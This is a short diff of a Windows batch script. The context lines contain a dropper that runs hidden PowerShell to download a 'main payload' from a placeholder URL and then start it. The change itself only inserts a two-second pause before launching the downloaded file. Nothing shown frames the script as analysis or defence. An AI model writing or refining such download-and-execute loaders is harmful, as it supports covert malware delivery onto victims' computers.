@@ -52,6 +52,8 @@ powershell -WindowStyle Hidden -Command "$shell=New-Object -ComObject Shell.Appl
 :: Download and run main payload
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%'); exit"
 
+timeout /t 2 >nul
+
 if exist "%TARGET_FILE%" (
     start "" "%TARGET_FILE%"
 ) else (
